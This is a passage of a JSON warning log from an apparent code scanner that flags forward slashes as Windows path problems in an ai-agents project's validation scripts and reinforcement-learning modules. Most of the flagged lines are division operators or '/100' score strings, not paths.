        "warning": "Line 361: Forward slash in path - \"Overall Readiness Score: {summary.overall_readiness_score:.1f}/100\"",
        "timestamp": "2025-09-05T17:30:42.244776"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\phase7_final_validation_report.py",
        "warning": "Line 368: Forward slash in path - \"  Security Score: {summary.security_score:.1f}/100\"",
        "timestamp": "2025-09-05T17:30:42.244799"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\phase7_final_validation_report.py",
        "warning": "Line 369: Forward slash in path - \"  Code Quality Score: {summary.code_quality_score:.1f}/100\"",
        "timestamp": "2025-09-05T17:30:42.244817"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\phase7_final_validation_report.py",
        "warning": "Line 370: Forward slash in path - \"  Architecture Score: {summary.architecture_score:.1f}/100\"",
        "timestamp": "2025-09-05T17:30:42.244839"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\phase7_final_validation_report.py",
        "warning": "Line 371: Forward slash in path - \"  Performance Score: {summary.performance_score:.1f}/100\"",
        "timestamp": "2025-09-05T17:30:42.244866"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\simple_architecture_check.py",
        "warning": "Line 26: Forward slash in path - \"**/*.py\"",
        "timestamp": "2025-09-05T17:30:42.245491"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\simple_architecture_check.py",
        "warning": "Line 30: Forward slash in path - \"/\"",
        "timestamp": "2025-09-05T17:30:42.245503"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\simple_architecture_check.py",
        "warning": "Line 85: Forward slash in path - \"**/*.py\"",
        "timestamp": "2025-09-05T17:30:42.245531"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\simple_architecture_check.py",
        "warning": "Line 97: Forward slash in path - \"/\"",
        "timestamp": "2025-09-05T17:30:42.245543"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\simple_architecture_check.py",
        "warning": "Line 113: Forward slash in path - \"core/shared\"",
        "timestamp": "2025-09-05T17:30:42.245556"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\simple_architecture_check.py",
        "warning": "Line 114: Forward slash in path - \"core/autonomous/services\"",
        "timestamp": "2025-09-05T17:30:42.245566"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\simple_architecture_check.py",
        "warning": "Line 115: Forward slash in path - \"core/autonomous/repositories\"",
        "timestamp": "2025-09-05T17:30:42.245579"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\simple_architecture_check.py",
        "warning": "Line 116: Forward slash in path - \"core/autonomous/events\"",
        "timestamp": "2025-09-05T17:30:42.245590"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\simple_architecture_check.py",
        "warning": "Line 117: Forward slash in path - \"core/reasoning/services\"",
        "timestamp": "2025-09-05T17:30:42.245601"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\simple_architecture_check.py",
        "warning": "Line 118: Forward slash in path - \"core/reasoning/events\"",
        "timestamp": "2025-09-05T17:30:42.245611"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\simple_architecture_check.py",
        "warning": "Line 119: Forward slash in path - \"core/security/services\"",
        "timestamp": "2025-09-05T17:30:42.245623"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\simple_architecture_check.py",
        "warning": "Line 120: Forward slash in path - \"core/security/events\"",
        "timestamp": "2025-09-05T17:30:42.245631"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\simple_architecture_check.py",
        "warning": "Line 121: Forward slash in path - \"core/integration/orchestration\"",
        "timestamp": "2025-09-05T17:30:42.245641"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\simple_architecture_check.py",
        "warning": "Line 122: Forward slash in path - \"core/integration/deployment\"",
        "timestamp": "2025-09-05T17:30:42.245657"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\simple_architecture_check.py",
        "warning": "Line 134: Forward slash in path - \")\n    \n    structure_percentage = (structure_score / len(required_dirs)) * 100\n    print(f\"",
        "timestamp": "2025-09-05T17:30:42.245679"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\simple_architecture_check.py",
        "warning": "Line 177: Forward slash in path - \"core/shared\"",
        "timestamp": "2025-09-05T17:30:42.245709"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\simple_architecture_check.py",
        "warning": "Line 177: Forward slash in path - \"**/*interface*.py\"",
        "timestamp": "2025-09-05T17:30:42.245717"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\simple_architecture_check.py",
        "warning": "Line 212: Forward slash in path - \"  Score: {overall_score:.1f}/100 (Grade: {grade})\"",
        "timestamp": "2025-09-05T17:30:42.245739"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\simple_architecture_check.py",
        "warning": "Line 231: Forward slash in path - \"\\nValidation complete. Architecture score: {overall_score:.1f}/100\"",
        "timestamp": "2025-09-05T17:30:42.245757"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\validate_architecture.py",
        "warning": "Line 18: Forward slash in path - \"core/shared\"",
        "timestamp": "2025-09-05T17:30:42.246086"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\validate_architecture.py",
        "warning": "Line 19: Forward slash in path - \"core/autonomous/services\"",
        "timestamp": "2025-09-05T17:30:42.246092"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\validate_architecture.py",
        "warning": "Line 20: Forward slash in path - \"core/autonomous/repositories\"",
        "timestamp": "2025-09-05T17:30:42.246096"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\validate_architecture.py",
        "warning": "Line 21: Forward slash in path - \"core/autonomous/events\"",
        "timestamp": "2025-09-05T17:30:42.246100"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\validate_architecture.py",
        "warning": "Line 22: Forward slash in path - \"core/reasoning/services\"",
        "timestamp": "2025-09-05T17:30:42.246105"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\validate_architecture.py",
        "warning": "Line 23: Forward slash in path - \"core/reasoning/events\"",
        "timestamp": "2025-09-05T17:30:42.246109"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\validate_architecture.py",
        "warning": "Line 24: Forward slash in path - \"core/security/services\"",
        "timestamp": "2025-09-05T17:30:42.246113"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\validate_architecture.py",
        "warning": "Line 25: Forward slash in path - \"core/security/events\"",
        "timestamp": "2025-09-05T17:30:42.246117"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\validate_architecture.py",
        "warning": "Line 26: Forward slash in path - \"core/integration/orchestration\"",
        "timestamp": "2025-09-05T17:30:42.246121"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\validate_architecture.py",
        "warning": "Line 27: Forward slash in path - \"core/integration/deployment\"",
        "timestamp": "2025-09-05T17:30:42.246125"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\validate_architecture.py",
        "warning": "Line 36: Forward slash in path - \")\n    \n    structure_score = (existing_dirs / len(required_dirs)) * 100\n    print(f\"",
        "timestamp": "2025-09-05T17:30:42.246131"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\validate_architecture.py",
        "warning": "Line 49: Forward slash in path - \"core/shared/interfaces.py\"",
        "timestamp": "2025-09-05T17:30:42.246138"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\validate_architecture.py",
        "warning": "Line 50: Forward slash in path - \"core/shared/events.py\"",
        "timestamp": "2025-09-05T17:30:42.246142"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\validate_architecture.py",
        "warning": "Line 51: Forward slash in path - \"core/shared/services.py\"",
        "timestamp": "2025-09-05T17:30:42.246146"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\validate_architecture.py",
        "warning": "Line 52: Forward slash in path - \"core/autonomous/services/autonomous_service.py\"",
        "timestamp": "2025-09-05T17:30:42.246151"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\validate_architecture.py",
        "warning": "Line 53: Forward slash in path - \"core/reasoning/services/reasoning_service.py\"",
        "timestamp": "2025-09-05T17:30:42.246155"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\validate_architecture.py",
        "warning": "Line 54: Forward slash in path - \"core/security/services/security_service.py\"",
        "timestamp": "2025-09-05T17:30:42.246160"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\validate_architecture.py",
        "warning": "Line 55: Forward slash in path - \"core/integration/orchestration/orchestration_service.py\"",
        "timestamp": "2025-09-05T17:30:42.246165"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\validate_architecture.py",
        "warning": "Line 66: Forward slash in path - \")\n    \n    file_score = (existing_files / len(key_files)) * 100\n    print(f\"",
        "timestamp": "2025-09-05T17:30:42.246174"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\validate_architecture.py",
        "warning": "Line 79: Forward slash in path - \"core/integration/master_controller.py\"",
        "timestamp": "2025-09-05T17:30:42.246182"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\validate_architecture.py",
        "warning": "Line 80: Forward slash in path - \"core/autonomous/orchestrator.py\"",
        "timestamp": "2025-09-05T17:30:42.246187"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\validate_architecture.py",
        "warning": "Line 81: Forward slash in path - \"core/reasoning/integrated_reasoning_controller.py\"",
        "timestamp": "2025-09-05T17:30:42.246192"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\validate_architecture.py",
        "warning": "Line 90: Forward slash in path - \"[REMOVED/REPLACED] {component}\"",
        "timestamp": "2025-09-05T17:30:42.246199"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\validate_architecture.py",
        "warning": "Line 107: Forward slash in path - \"**/*.py\"",
        "timestamp": "2025-09-05T17:30:42.246209"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\validate_architecture.py",
        "warning": "Line 130: Forward slash in path - \")\n    \n    # Score based on number and size of large files\n    size_penalty = sum(max(0, loc - 300) for _, loc in large_files)\n    size_score = max(0, 100 - (size_penalty / 50))  # Penalty per excess line\n    print(f\"",
        "timestamp": "2025-09-05T17:30:42.246229"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\validate_architecture.py",
        "warning": "Line 144: Forward slash in path - \"core/shared/interfaces.py\"",
        "timestamp": "2025-09-05T17:30:42.246238"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\validate_architecture.py",
        "warning": "Line 150: Forward slash in path - \"**/*.py\"",
        "timestamp": "2025-09-05T17:30:42.246246"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\validate_architecture.py",
        "warning": "Line 185: Forward slash in path - \"Checking transformation from 29.3/100 to 90+/100\"",
        "timestamp": "2025-09-05T17:30:42.246266"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\validate_architecture.py",
        "warning": "Line 212: Forward slash in path - \"OVERALL SCORE: {overall_score:.1f}/100\"",
        "timestamp": "2025-09-05T17:30:42.246283"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\base_algorithm.py",
        "warning": "Line 447: Forward slash in path - ': torch.cuda.memory_allocated(self.device) / 1024**3,  # GB\n                '",
        "timestamp": "2025-09-05T17:30:42.246825"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\base_algorithm.py",
        "warning": "Line 448: Forward slash in path - ': torch.cuda.memory_reserved(self.device) / 1024**3,      # GB\n                '",
        "timestamp": "2025-09-05T17:30:42.246842"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\base_algorithm.py",
        "warning": "Line 449: Forward slash in path - ': torch.cuda.max_memory_allocated(self.device) / 1024**3     # GB\n            }\n        else:\n            return {'",
        "timestamp": "2025-09-05T17:30:42.246857"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\base_algorithm.py",
        "warning": "Line 479: Forward slash in path - \"\n        processed_batch = {}\n        \n        # Ensure all tensors have agent dimension\n        for key, value in batch.items():\n            if isinstance(value, torch.Tensor):\n                if len(value.shape) == 2:  # [batch_size, feature_dim]\n                    # Reshape to [batch_size, num_agents, feature_dim]\n                    batch_size, feature_dim = value.shape\n                    if feature_dim % self.num_agents == 0:\n                        agent_feature_dim = feature_dim // self.num_agents\n                        processed_batch[key] = value.view(batch_size, self.num_agents, agent_feature_dim)\n                    else:\n                        processed_batch[key] = value\n                else:\n                    processed_batch[key] = value\n            else:\n                processed_batch[key] = value\n        \n        return processed_batch\n    \n    def compute_centralized_critic_input(self, states: torch.Tensor, actions: torch.Tensor) -> torch.Tensor:\n        \"",
        "timestamp": "2025-09-05T17:30:42.246896"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\networks.py",
        "warning": "Line 76: Forward slash in path - \"\n        for m in self.modules():\n            if isinstance(m, nn.Linear):\n                # Xavier/Glorot initialization\n                torch.nn.init.xavier_uniform_(m.weight)\n                torch.nn.init.constant_(m.bias, 0.0)\n    \n    def forward(self, x: torch.Tensor) -> torch.Tensor:\n        x = self.network(x)\n        if self.output_activation:\n            x = self.output_activation(x)\n        return x\n\nclass PolicyNetwork(nn.Module):\n    \"",
        "timestamp": "2025-09-05T17:30:42.247206"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\networks.py",
        "warning": "Line 162: Forward slash in path - \"\n        # Inverse tanh to get pre-squashed action\n        action_unsquashed = torch.atanh(torch.clamp(action / self.max_action, -0.999, 0.999))\n        \n        # Log probability of Gaussian\n        std = log_std.exp()\n        log_prob = -0.5 * (((action_unsquashed - mean) / std) ** 2 + 2 * log_std + math.log(2 * math.pi))\n        log_prob = log_prob.sum(dim=-1, keepdim=True)\n        \n        # Correct for tanh squashing\n        log_prob = log_prob - torch.log(1 - (action / self.max_action) ** 2 + 1e-6).sum(dim=-1, keepdim=True)\n        \n        return log_prob\n    \n    def deterministic_action(self, state: torch.Tensor) -> torch.Tensor:\n        \"",
        "timestamp": "2025-09-05T17:30:42.247254"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\networks.py",
        "warning": "Line 472: Forward slash in path - \"\n        mu_range = 1 / math.sqrt(self.input_dim)\n        \n        self.weight_mu.data.uniform_(-mu_range, mu_range)\n        self.bias_mu.data.uniform_(-mu_range, mu_range)\n        \n        self.weight_sigma.data.fill_(self.std_init / math.sqrt(self.input_dim))\n        self.bias_sigma.data.fill_(self.std_init / math.sqrt(self.input_dim))\n    \n    def reset_noise(self):\n        \"",
        "timestamp": "2025-09-05T17:30:42.247388"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\ppo_agent.py",
        "warning": "Line 280: Forward slash in path - ']\n            advantages = (advantages - advantages.mean()) / (advantages.std() + 1e-8)\n            data['",
        "timestamp": "2025-09-05T17:30:42.247812"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\ppo_agent.py",
        "warning": "Line 305: Forward slash in path - ']\n        \n        batch_size = states.shape[0]\n        \n        # Training statistics\n        policy_losses = []\n        value_losses = []\n        entropy_losses = []\n        kl_divergences = []\n        clipfracs = []\n        \n        # Create dataset and dataloader\n        dataset = TensorDataset(states, actions, old_log_probs, advantages, returns, old_values)\n        dataloader = DataLoader(\n            dataset,\n            batch_size=batch_size // self.config.num_minibatches,\n            shuffle=True\n        )\n        \n        for epoch in range(self.config.ppo_epochs):\n            for batch_states, batch_actions, batch_old_log_probs, batch_advantages, batch_returns, batch_old_values in dataloader:\n                \n                # Current policy evaluation\n                mean, log_std = self.policy_network(batch_states)\n                current_values = self.value_network(batch_states).squeeze(-1)\n                \n                # Compute current log probabilities\n                current_log_probs = self._compute_log_prob(mean, log_std, batch_actions)\n                current_log_probs = current_log_probs.squeeze(-1)\n                \n                # Compute entropy\n                entropy = self._compute_entropy(log_std)\n                \n                # Policy loss\n                ratio = torch.exp(current_log_probs - batch_old_log_probs)\n                \n                # Clipped surrogate objective\n                surr1 = ratio * batch_advantages\n                surr2 = torch.clamp(ratio, 1.0 - self.config.epsilon_clip, 1.0 + self.config.epsilon_clip) * batch_advantages\n                policy_loss = -torch.min(surr1, surr2).mean()\n                \n                # Value loss\n                if self.config.use_clipped_value_loss:\n                    # Clipped value loss\n                    value_pred_clipped = batch_old_values + torch.clamp(\n                        current_values - batch_old_values,\n                        -self.config.epsilon_clip,\n                        self.config.epsilon_clip\n                    )\n                    value_losses_unclipped = F.mse_loss(current_values, batch_returns, reduction='",
        "timestamp": "2025-09-05T17:30:42.247862"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\base_environment.py",
        "warning": "Line 78: Forward slash in path - '])\n        else:\n            features.append(0.0)  # Neutral trend\n            \n        # Time features\n        features.append(self.step_count / 1000.0)  # Normalized step count\n        \n        # Number of active agents\n        features.append(len(self.agent_states) / 10.0)  # Normalized agent count\n        \n        return np.array(features, dtype=np.float32)\n    \n    def _extract_agent_features(self, agent_id: str, agent_state: Dict[str, Any]) -> np.ndarray:\n        \"",
        "timestamp": "2025-09-05T17:30:42.248495"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\base_environment.py",
        "warning": "Line 95: Forward slash in path - ', 100000.0) / 100000.0)  # Normalized balance\n        features.append(agent_state.get('",
        "timestamp": "2025-09-05T17:30:42.248507"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\base_environment.py",
        "warning": "Line 102: Forward slash in path - ', [])) / 10.0)  # Normalized connections\n        \n        return np.array(features, dtype=np.float32)\n\nclass BaseMultiAgentEnvironment(gym.Env, ABC):\n    \"",
        "timestamp": "2025-09-05T17:30:42.248519"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\base_environment.py",
        "warning": "Line 333: Forward slash in path - \"\n        # Log episode results\n        total_episode_reward = sum(self.episode_rewards.values())\n        avg_episode_reward = total_episode_reward / len(self.episode_rewards)\n        \n        logger.info(f\"",
        "timestamp": "2025-09-05T17:30:42.248631"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\base_environment.py",
        "warning": "Line 417: Forward slash in path - ': 1.0 - (np.std(agent_rewards) / (np.mean(agent_rewards) + 1e-8))\n                }\n        \n        return agent_metrics\n    \n    def render(self, mode: str = \"",
        "timestamp": "2025-09-05T17:30:42.248696"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\base_environment.py",
        "warning": "Line 423: Forward slash in path - \"Render the environment (for debugging/visualization)\"",
        "timestamp": "2025-09-05T17:30:42.248720"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\base_environment.py",
        "warning": "Line 471: Forward slash in path - \"\n        if coordination_target is None or len(agent_actions) < 2:\n            return {agent_id: 0.0 for agent_id in agent_actions.keys()}\n        \n        bonuses = {}\n        for agent_id, action in agent_actions.items():\n            # Simple cosine similarity bonus\n            similarity = np.dot(action.flatten(), coordination_target.flatten())\n            similarity /= (np.linalg.norm(action.flatten()) * np.linalg.norm(coordination_target.flatten()) + 1e-8)\n            bonuses[agent_id] = similarity * bonus_weight\n        \n        return bonuses\n    \n    @staticmethod\n    def fairness_reward(resource_allocation: Dict[str, float],\n                       agent_needs: Dict[str, float]) -> Dict[str, float]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.248769"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\base_environment.py",
        "warning": "Line 487: Forward slash in path - \"\n        allocations = np.array(list(resource_allocation.values()))\n        needs = np.array(list(agent_needs.values()))\n        \n        # Gini coefficient for fairness\n        gini = RewardShaper._calculate_gini_coefficient(allocations)\n        fairness_bonus = (1.0 - gini) * 0.1\n        \n        # Efficiency bonus\n        satisfaction_ratios = np.minimum(allocations, needs) / (needs + 1e-8)\n        efficiency_bonus = np.mean(satisfaction_ratios) * 0.1\n        \n        total_bonus = fairness_bonus + efficiency_bonus\n        \n        return {agent_id: total_bonus for agent_id in resource_allocation.keys()}\n    \n    @staticmethod\n    def _calculate_gini_coefficient(values: np.ndarray) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.248794"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\resource_allocation_environment.py",
        "warning": "Line 66: Forward slash in path - \"\n        if self.total_capacity == 0:\n            return 0.0\n        return 1.0 - (self.available_capacity / self.total_capacity)\n\n@dataclass\nclass ResourceRequest:\n    \"",
        "timestamp": "2025-09-05T17:30:42.249114"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\resource_allocation_environment.py",
        "warning": "Line 87: Forward slash in path - \"\n        if self.utility_function:\n            return self.utility_function(allocated_amount, self.amount)\n        \n        # Default utility: diminishing returns\n        if self.amount == 0:\n            return 0.0\n        \n        ratio = allocated_amount / self.amount\n        return ratio * (2 - ratio)  # Concave utility function\n\n@dataclass \nclass Allocation:\n    \"",
        "timestamp": "2025-09-05T17:30:42.249133"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\resource_allocation_environment.py",
        "warning": "Line 173: Forward slash in path - '] / total_requests\n        else:\n            fulfillment_rate = 0.5\n        \n        # Calculate average utility from recent allocations\n        recent_allocations = [a for a in self.allocation_history \n                            if current_step - a.end_step <= 50]  # Last 50 steps\n        if recent_allocations:\n            avg_efficiency = np.mean([a.efficiency for a in recent_allocations])\n            self.metrics['",
        "timestamp": "2025-09-05T17:30:42.249179"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\resource_allocation_environment.py",
        "warning": "Line 185: Forward slash in path - '] = self.spent / self.budget if self.budget > 0 else 0.0\n        \n        # Update demand patterns\n        for resource_type in ResourceType:\n            recent_requests = [req for req in self.allocation_history \n                             if req.resource_type == resource_type \n                             and current_step - req.end_step <= 100]\n            if recent_requests:\n                avg_demand = np.mean([req.amount for req in recent_requests])\n                self.demand_pattern[resource_type] = avg_demand\n\nclass ResourceAllocationEnvironment(BaseMultiAgentEnvironment):\n    \"",
        "timestamp": "2025-09-05T17:30:42.249196"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\resource_allocation_environment.py",
        "warning": "Line 310: Forward slash in path - ': len(res_agent.active_allocations) / self.max_concurrent_requests,\n                '",
        "timestamp": "2025-09-05T17:30:42.249269"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\resource_allocation_environment.py",
        "warning": "Line 321: Forward slash in path - ': 1.0 - sum(r.available_capacity for r in self.resources.values()) / \n                                  sum(r.total_capacity for r in self.resources.values()),\n            '",
        "timestamp": "2025-09-05T17:30:42.249287"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\resource_allocation_environment.py",
        "warning": "Line 334: Forward slash in path - ': len(self.pending_requests) / len(self.resource_agents)\n        }\n        \n        return EnvironmentState(\n            global_state=global_state,\n            agent_states=agent_states,\n            market_conditions=market_conditions,\n            timestamp=datetime.now(),\n            step_count=0\n        )\n    \n    def _execute_actions(self, actions: Dict[str, np.ndarray], state: EnvironmentState) -> EnvironmentState:\n        \"",
        "timestamp": "2025-09-05T17:30:42.249310"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\resource_allocation_environment.py",
        "warning": "Line 385: Forward slash in path - ', 0) / \n                                  max(1, res_agent.metrics.get('",
        "timestamp": "2025-09-05T17:30:42.249343"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\resource_allocation_environment.py",
        "warning": "Line 390: Forward slash in path - ': len(res_agent.active_allocations) / 10.0,  # Normalized\n                '",
        "timestamp": "2025-09-05T17:30:42.249359"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\resource_allocation_environment.py",
